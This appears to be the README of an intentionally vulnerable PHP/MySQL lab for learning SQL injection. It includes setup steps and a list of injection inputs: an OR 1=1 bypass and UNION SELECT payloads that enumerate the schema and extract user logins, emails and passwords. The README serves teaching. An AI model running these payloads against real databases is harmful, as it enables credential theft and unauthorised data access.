## SQL Injection Example Code

### IMPORTANT: Do not place this code on a server that can be accessed by others.

To get things up and running:

* Create a database in MySQL, and edit these lines in `bad-inj-show.php` to match:
```php
$dsn = 'mysql:dbname=my_dbname;host=127.0.0.1';
$user = 'my_user';
$password = 'my_password';
```
* Insert the my_users table from the `db_dump.sql` file with a command like this:
```sh
$ mysql -u my_user -pmy_password my_db_name < db_dump.sql
```

* Host the code locally using something like [MAMP](http://www.mamp.info/en/) or [XAMPP](https://www.apachefriends.org/index.html).

* Navigate to the `bad-inj.php` page in your browser and play around with the form.

Here are some examples of some input to try:

```
ed@example.com

a" OR 1 = 1 -- 

a" UNION ALL SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES; -- 

a" UNION ALL SELECT COLUMN_NAME,COLUMN_TYPE from information_schema.COLUMNS where TABLE_NAME = "my_users"; -- 

a" UNION ALL SELECT user_login,user_pass from my_users; -- 

a" UNION ALL SELECT user_email,user_pass from my_users; -- 
```

And I think it goes without saying, use this knowledge for learning how to protect yourself, and for the greater good ;)

------

This is free and unencumbered software released into the public domain.

Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.

In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

For more information, please refer to <http://unlicense.org/>